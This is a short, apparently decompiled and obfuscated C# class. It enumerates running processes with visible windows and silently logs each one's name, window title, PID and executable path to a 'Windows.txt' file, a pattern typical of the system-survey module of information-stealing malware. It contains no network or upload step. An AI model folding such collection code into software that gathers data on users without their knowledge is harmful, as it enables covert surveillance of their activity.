using System.Diagnostics;
using System.IO;

namespace ns5;

internal sealed class Class17
{
	public static void smethod_0(string string_0)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			try
			{
				if (!string.IsNullOrEmpty(process.MainWindowTitle))
				{
					File.AppendAllText(string_0 + "\\Windows.txt", "NAME: " + process.ProcessName + "\n\tTITLE: " + process.MainWindowTitle + "\n\tPID: " + process.Id + "\n\tEXE: " + Class22.smethod_1(process) + "\n\n");
				}
			}
			catch
			{
			}
		}
	}
}
